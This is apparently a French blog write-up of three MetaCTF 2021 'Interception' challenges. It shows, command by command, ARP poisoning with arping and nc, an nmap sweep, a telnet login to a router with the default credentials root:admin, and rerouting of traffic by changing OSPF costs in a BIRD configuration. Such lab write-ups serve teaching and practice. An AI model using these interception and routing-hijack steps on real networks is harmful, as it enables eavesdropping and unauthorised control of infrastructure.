---
layout: post
author: [FPI, ABE]
title: "Interception - MetaCTF 2021"
date: 2021-12-03
categories: [CTF, Misc]
background_image: assets/Tridroid-Banner.jpg
title_color: "#ffffff"
---

# Interception - Partie I

Dans ce challenge, l'objectif est de réaliser une attaque de type Man In The Middle (MiTM) sur un réseau local afin de capturer le trafic UDP.

## Détails

- Catégorie : misc
- Points : 100
- Résolutions : 200

### Description

192.168.0.1 is periodically (once every 4 seconds) sending the flag to 192.168.0.2 over UDP port 8000. Go get it.

`ssh ctf-1@host.cg21.metaproblems.com -p 7000`

## Méthodologie

### Comprendre le problème

La connexion se fait par SSH sur le port 7000. Une fois connecté, nous sommes sur une machine busybox en tant qu'utilisateur root. 

```
/ # uname -a
Linux 5b9ec8c79c03 5.11.0-1021-aws #22~20.04.2-Ubuntu SMP Wed Oct 27 21:27:13 UTC 2021 x86_64 Linux

/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

/ # ls -l /bin/
total 912
lrwxrwxrwx    1 root     root            12 Nov 24 09:20 arch -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Nov 24 09:20 ash -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Nov 24 09:20 base64 -> /bin/busybox
lrwxrwxrwx    1 root     root            12 Nov 24 09:20 bbconfig -> /bin/busybox
-rwxr-xr-x    1 root     root        824984 Nov 23 00:57 busybox
-rwxr-xr-x    1 root     root        104072 Nov 23 00:57 busybox-extras
[...]
```

D'après la description du challenge, 192.168.0.1 (victime) envoie le flag à 192.168.0.2 (serveur). D'autre part, notre adresse IP est 192.168.0.3 :

```
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
19168: eth0@if19169: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:0a:02:12:c4 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.3/24 scope global eth0
       valid_lft forever preferred_lft forever
```

La topologie du réseau est décrite ci-dessous : 

![](/assets/posts/2021-12-03-Interception-MetaCTF/topo1.png)


### Résoudre le problème

L'objectif est d'intercepter le flag en mettant en place une attaque de type MiTM pour usurper l'adresse IP du serveur (192.168.0.2). Tout d'abord, il est important de noter que nous sommes dans le même réseau local que la victime et le serveur (192.168.0.0/24). Ainsi, la meilleure façon de mettre en place ce type d'attaque est d'utiliser l'empoisonnement ARP.

ARP est l'abréviation de Address Resolution Protocol (protocole de résolution d'adresse). Il est utilisé par les switches pour faire correspondre une adresse IP à une adresse MAC. Cela permet d'identifier précisément tous les appareils du réseau.

Sachant cela, tout ce que nous avons à faire est d'empoisonner la table ARP de la victime pour lui faire croire que l'adresse IP du serveur est associée à notre adresse MAC. La victime cherchera dans sa table ARP l'adresse MAC associée à l'adresse IP du serveur (qui sera la nôtre) et enverra ensuite le flag à cette adresse MAC. Nous pouvons alors intercepter le flag en utilisant `nc` ou `tcpdump`.


### Implémentation de la solution

La machine distante n'a pas accès à Internet et ne dispose pas de `apt`. 

```
/ # ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8): 56 data bytes
ping: sendto: Network unreachable
```
Nous avons dû composer avec le peu d'outils pré-installés (rappelez-vous que nous étions connectés à une machine busybox). Les outils habituels comme `ettercap` ou `arpspoof` ne sont pas installés par défaut. Après quelques recherches, les seuls outils qui semblent être intéressants sont `arping`, `tcpdump` et `nc`. 

```
/ # which nc tcpdump
/usr/bin/nc
/usr/bin/tcpdump

/ # ls -l /usr/sbin/
total 0
...
lrwxrwxrwx    1 root     root            12 Nov 24 09:20 arping -> /bin/busybox
...
```

L'utilitaire `arping` nous permet d'envoyer des réponses ARP non sollicitées à la victime (en utilisant le paramètre `-U`), mettant donc à jour sa table ARP.

```
/ # arping --help
BusyBox v1.34.1 (2021-11-23 00:57:35 UTC) multi-call binary.

Usage: arping [-fqbDUA] [-c CNT] [-w TIMEOUT] [-I IFACE] [-s SRC_IP] DST_IP

Send ARP requests/replies

	-f		Quit on first ARP reply
	-q		Quiet
	-b		Keep broadcasting, don't go unicast
	-D		Exit with 1 if DST_IP replies
	-U		Unsolicited ARP mode, update your neighbors
	-A		ARP answer mode, update your neighbors
	-c N		Stop after sending N ARP requests
	-w TIMEOUT	Seconds to wait for ARP reply
	-I IFACE	Interface to use (default eth0)
	-s SRC_IP	Sender IP address
	DST_IP		Target IP address
```

Arping ne nous permet pas d'utiliser une adresse IP d'expéditeur qui n'est pas définie dans une de nos interfaces réseau. Nous avons donc dû créer une sous-interface avec l'adresse IP du serveur :

```
/ # ifconfig eth0:1 192.168.0.2

/ # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:0A:02:13:84
          inet addr:192.168.0.3  Bcast:0.0.0.0  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:13 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:978 (978.0 B)  TX bytes:42 (42.0 B)

eth0:1    Link encap:Ethernet  HWaddr 02:42:0A:02:13:84
          inet addr:192.168.0.2  Bcast:192.168.0.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1a
```

Dès lors, nous avons pu envoyer la réponse ARP en utilisant `arping` tout en configurant un listener sur le port UDP 8000 :

```
/ # arping -c 1 -U -s 192.168.0.2 192.168.0.1
ARPING 192.168.0.1 from 192.168.0.2 eth0
Sent 1 probe(s) (0 broadcast(s))
Received 0 response(s) (0 request(s), 0 broadcast(s))

/ # nc -ul 8000
MetaCTF{addr3s5_r3s0lut1on_pwn4g3}
```

Le flag est alors apparu dans notre sortie `nc`.

Par ailleurs, cela fonctionne également en spécifiant une autre adresse IP du même sous-réseau (`arping` met à jour les adresses IP de tous les voisins lorsque le paramètre `-U` est spécifié). 

```
/ # ifconfig eth0:1 192.168.0.2

/ # arping -c 1 -U -s 192.168.0.2 192.168.0.99
ARPING 192.168.0.99 from 192.168.0.2 eth0
Sent 1 probe(s) (0 broadcast(s))
Received 0 response(s) (0 request(s), 0 broadcast(s))

/ # nc -ul 8000
MetaCTF{addr3s5_r3s0lut1on_pwn4g3}
```

Flag : **MetaCTF{addr3s5_r3s0lut1on_pwn4g3}**

# Interception - Partie II

Dans ce challenge, l'objectif est de réaliser une attaque de type Man In The Middle (MiTM) sur un réseau local afin de capturer le trafic TCP sans connaitre les adresses IP des machines cibles.

## Details

- Catégorie : other
- Points : 150
- Résolutions : 126

### Description

Someone on this network is periodically sending the flag to ... someone else on this network, over TCP port 8000. Go get it. 

`ssh ctf-46ed3559da08@host.cg21.metaproblems.com -p 7000`

## Méthodologie

### Comprendre le problème

Le problème est similaire à celui décrit ci-dessus mais, cette fois-ci, nous ne savons pas qui sont la victime et le serveur. De plus, le flag est envoyé via TCP. 

La topologie du réseau est décrite ci-dessous : 

![](/assets/posts/2021-12-03-Interception-MetaCTF/topo2.png)

### Résoudre le problème

Nous devons identifier la victime et le serveur pour récupérer leurs adresses IP avant de mettre en place la même attaque que ci-dessus. 

### Implémentation de la solution

Nous étions toujours sur une machine busybox, mais cette fois-ci `nmap` était installé :

```
/ # which nmap
/usr/bin/nmap
```

Nous pouvons donc l'utiliser pour découvrir quel serveur va recevoir le flag  :

```
/ # nmap -p 8000 192.168.0.* | grep -B 4 open
Nmap scan report for ip-192-168-0-78.ec2.internal (192.168.0.78)
Host is up (0.000014s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt
```

Nous avons ensuite utilisé la même technique que précédemment :

```
/ # ifconfig eth0:1 192.168.0.78

/ # arping -c 1 -U -s 192.168.0.78 192.168.0.1
ARPING 192.168.0.1 from 192.168.0.78 eth0
Sent 1 probe(s) (0 broadcast(s))
Received 0 response(s) (0 request(s), 0 broadcast(s))

/ # nc -l 8000
MetaCTF{s0_m4ny_1ps_but_wh1ch_t0_ch00s3}
```

Flag : **MetaCTF{s0_m4ny_1ps_but_wh1ch_t0_ch00s3}**

# Interception III

Par : ABE + FPI

Dans ce challenge, les machines cibles ne sont pas dans le même réseau que nous. L'objectif est donc de compromettre un routeur afin de modifier la route empruntée par les paquets. Ceci dans le but de les intercepter en écoutant le trafic UDP sur le routeur compromis.

## Details

- Catégorie : other
- Points : 275
- Résolutions : 45

### Description

192.168.55.3 is periodically sending the flag to 172.16.0.2 over UDP port 8000. Go get it. By the way, I've been told the admins at this organization use really shoddy passwords. 

`ssh ctf-f36ef72cadc1@host.cg21.metaproblems.com -p 7000` 

## Méthodologie

### Comprendre le problème

D'après la description, il s'agit exactement du même problème que ci-dessus, mais cette fois-ci, il y a au moins deux réseaux différents avec lesquels il faut travailler.

En se connectant à la machine par SSH, il y a en fait trois réseaux différents, car nous n'étions pas dans l'un des deux précédents : 

```
/ # ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
19298: enp0s0@if19299: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:0a:02:16:04 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.3/24 scope global enp0s0
       valid_lft forever preferred_lft forever
```

La topologie du réseau est décrite ci-dessous :

![](/assets/posts/2021-12-03-Interception-MetaCTF/topo3.png)

### Résoudre le problème

Comme nous devions traiter avec différents réseaux, la méthode d'empoisonnement ARP que nous utilisions jusqu'à présent ne pouvait plus fonctionner. Ici, nous devrons effectuer une attaque sur la couche réseau.

Lorsque la victime envoie le flag au serveur, le paquet emprunte la route ci-dessous (représentée en rouge) :

![](/assets/posts/2021-12-03-Interception-MetaCTF/orig_poid.png)

L'idée est donc de forcer tout le trafic du réseau de la victime à passer par notre routeur. Le flag empruntera donc la route suivante :  

![](/assets/posts/2021-12-03-Interception-MetaCTF/new_path.png)

Pour ce faire, nous devons compromettre notre propre routeur d'une manière ou d'une autre. Heureusement, les auteurs nous ont donné des informations d'identification dans un indice. Peut-être pourrions-nous les utiliser quelque part pour obtenir un accès.


### Implémentation de la solution

Nous avons commencé par scanner notre propre réseau :
```
/ # nmap 192.168.0.*
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-11 17:25 UTC
Nmap scan report for ip-192-168-0-1.ec2.internal (192.168.0.1)
Host is up (0.000026s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet
MAC Address: 02:42:0A:02:16:02 (Unknown)

Nmap scan report for ip-192-168-0-2.ec2.internal (192.168.0.2)
Host is up (0.000012s latency).
All 1000 scanned ports on ip-192-168-0-2.ec2.internal (192.168.0.2) are in ignored states.
Not shown: 1000 closed tcp ports (reset)
MAC Address: 02:42:0A:02:16:03 (Unknown)

Nmap scan report for ip-192-168-0-3.ec2.internal (192.168.0.3)
Host is up (0.0000090s latency).
All 1000 scanned ports on ip-192-168-0-3.ec2.internal (192.168.0.3) are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Nmap done: 256 IP addresses (3 hosts up) scanned in 2.43 seconds
```

Nous avons découvert que le port 23 est ouvert sur notre routeur (192.168.0.1). Nous avons donc essayé de nous y connecter en utilisant les informations d'identification fournies (`root:admin`) : 

```
/ # telnet 192.168.0.1
Connected to 192.168.0.1

Entering character mode
Escape character is '^]'.

Debian GNU/Linux 11
router-sales login: root
Password:
Linux router-sales 5.11.0-1021-aws #22~20.04.2-Ubuntu SMP Wed Oct 27 21:27:13 UTC 2021 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@router-sales:~#
```

La première chose que nous avons remarquée est qu'un étrange utilitaire "bird" a été préinstallé :

```
root@router-sales:~# ls -la
total 1132
drwx------ 1 root root    4096 Dec  4 11:55 .
drwxr-xr-x 1 root root    4096 Dec 11 17:22 ..
-rw-rw-r-- 1 root root     135 Dec  3 13:29 .bashrc
-rw-r--r-- 1 root root     161 Jul  9  2019 .profile
drwxrwxr-x 1 1000 1000    4096 Dec  3 09:10 bird-2.0.8
-rw-r--r-- 1 root root 1135228 Dec  3 09:09 bird-2.0.8.tar.gz
```

Après quelques recherches, nous avons découvert que c'est un démon de routage. Son fichier de configuration est présenté ci-dessous :

```
root@router-sales:~# cat /usr/local/etc/bird.conf
# COMPANY BIRD CONFIGURATION

# Configure logging
log syslog all;

protocol device {
}

protocol direct {
        ipv4;
}

protocol kernel {
        ipv4 {
              export all;
        };
}

protocol ospf {
        ipv4 {
              import filter {
                      if net.len > 24 then reject; else accept; # overly specific routes are sus!
              };
              export filter {
                      ospf_metric1 = 1000;
                      if source = RTS_STATIC then accept; else reject;
              };
        };

        area 0 {
              interface "enp1s0" { # sales - executive dept link
                      type ptp;
                      cost 6;
                      hello 5;
              };
              interface "enp2s0" { # sales - it dept link
                      type ptp;
                      cost 7;
                      hello 5;
              };
              interface "enp3s0" { # it dept - executive link
                      type ptp;
                      cost 8;
                      hello 5;
              };
              interface "enp0s0" {
                      stub;
              };
        };
}
```

Toutes les interfaces ont trois paramètres : type, cost et hello. Le seul qui nous intéresse est "cost".

Le protocole Open Shortest Path First (OSPF) est utilisé. Ce protocole détermine le chemin le plus court pour chaque paquet à livrer en prenant en compte le paramètre "coût". Le chemin le plus court est celui qui présente le facteur "coût" le plus faible. 

Par exemple, dans la configuration par défaut, le chemin le plus court est celui représenté en rouge. Il a un facteur "coût" de 8, au lieu de 13 pour le chemin alternatif : 

![](/assets/posts/2021-12-03-Interception-MetaCTF/orig_poid.png)

Les modifications ne sont prises en compte qu'après rechargement du fichier de configuration. Pour cela, nous avons utilisé le client `birdc` existant :

```
root@router-sales:~# birdc
BIRD 2.0.8 ready.
bird> ?
quit                                           Quit the client
exit                                           Exit the client
help                                           Description of the help system
show ...                                       Show status information
dump ...                                       Dump debugging information
eval <expr>                                    Evaluate an expression
echo ...                                       Control echoing of log messages
disable (<protocol> | "<pattern>" | all) [message]  Disable protocol
enable (<protocol> | "<pattern>" | all) [message]  Enable protocol
restart (<protocol> | "<pattern>" | all) [message]  Restart protocol
reload <protocol> | "<pattern>" | all          Reload protocol
debug ...                                      Control protocol debugging via BIRD logs
mrtdump ...                                    Control protocol debugging via MRTdump files
restrict                                       Restrict current CLI session to safe commands
configure ...                                  Reload configuration
down                                           Shut the daemon down
graceful restart                               Shut the daemon down for graceful restart

bird> configure
Reading configuration from /usr/local/etc/bird.conf
Reconfigured
```

Nous avons modifié les facteurs "coût" de manière à ce que leur somme soit inférieure à 8 (c'est-à-dire 1 et 1) : 

```
        area 0 {
              interface "enp1s0" { # sales - executive dept link
                      type ptp;
                      cost 1;
                      hello 5;
              };
              interface "enp2s0" { # sales - it dept link
                      type ptp;
                      cost 1;
                      hello 5;
              };
              interface "enp3s0" { # it dept - executive link
                      type ptp;
                      cost 8;
                      hello 5;
              };
              interface "enp0s0" {
                      stub;
              };
        };
```

Le nouveau chemin le plus court devient alors le suivant :

![](/assets/posts/2021-12-03-Interception-MetaCTF/new_poid.png)

Comme le flag est envoyé via UDP, nous avons capturé tout le trafic passant par notre routeur :

```
root@router-sales:~# tcpdump udp -i enp1s0 -X
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on enp1s0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
17:50:26.993166 IP 192.168.55.3.43303 > 172.16.0.2.8000: UDP, length 38
	0x0000:  4500 0042 c597 4000 3f11 d255 c0a8 3703  E..B..@.?..U..7.
	0x0010:  ac10 0002 a927 1f40 002e a3fd 4d65 7461  .....'.@....Meta
	0x0020:  4354 467b 6c30 306b 5f61 745f 6d33 5f31  CTF{l00k_at_m3_1
	0x0030:  6d5f 7468 335f 7230 7574 3372 5f6e 3077  m_th3_r0ut3r_n0w
	0x0040:  7d0a                                     }.
```

Et le flag était à nous :

Flag : **MetaCTF{l00k_at_m3_1m_th3_r0ut3r_n0w}**
